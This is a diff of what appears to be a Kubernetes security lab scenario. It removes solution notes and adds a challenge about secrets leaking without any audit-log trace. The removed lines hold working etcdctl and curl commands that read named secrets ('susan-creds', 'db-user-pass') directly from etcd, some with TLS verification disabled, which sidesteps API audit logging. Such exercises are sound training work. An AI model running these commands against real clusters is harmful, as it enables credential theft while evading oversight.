@@ -1,21 +1,3 @@
-should end up so you can curl --insecure secrets endpoint in etcd on https: end point
-
-cd /tmp/
-curl -LO https://github.com/etcd-io/etcd/releases/download/v3.3.9/etcd-v3.3.9-linux-amd64.tar.gz
-tar xzvf etcd-v3.3.9-linux-amd64.tar.gz
-mv etcd-v3.3.9-linux-amd64/etcdctl /usr/local/bin/
-
-ETCDCTL_API=3 etcdctl --endpoints=https://172.31.2.153:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt --key=/etc/kubernetes/pki/etcd/healthcheck-client.key get /registry/secrets/default/susan-creds
-ETCDCTL_API=3 etcdctl --endpoints=https://172.31.2.8:2379 get /registry/secrets/default/susan-creds
-ETCDCTL_API=3 etcdctl --endpoints=https://172.31.2.8:2379 --insecure-skip-tls-verify get /registry/secrets/default/susan-creds
---cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt --key=/etc/kubernetes/pki/etcd/healthcheck-client.key get /registry/secrets/default/susan-creds
-
-curl --cacert /etc/kubernetes/pki/etcd/ca.crt https://172.31.2.8:2379/v3/registry/secrets/default/db-user-pass
-curl --cacert /etc/kubernetes/pki/etcd/ca.crt https://172.31.2.8:2379/version
-curl --insecure -L 'https://172.31.2.8:2379/v3/keys/registry/services/endpoints/default/echoheaders-x'
-curl --insecure https://172.31.2.153:2379/version
-curl --insecure https://172.31.2.153:2379/v3/registry/secrets/default/db-user-pass
-
-
-https://172.31.2.153:2379
-ETCDCTL_API=3 etcdctl --endpoints=https://172.31.2.139:2379 --insecure-transport=false --insecure-skip-tls-verify get /registry/secrets/default/db-user-pass
+A developer has reported secrets leaking from your cluster, but no record of requests has been found in your API audit logs or through the kubelet.
+How can you access secrets from inside a pod in the cluster.
+Your cluster is running with master IP: $MASTER_IP_ADDRESSES
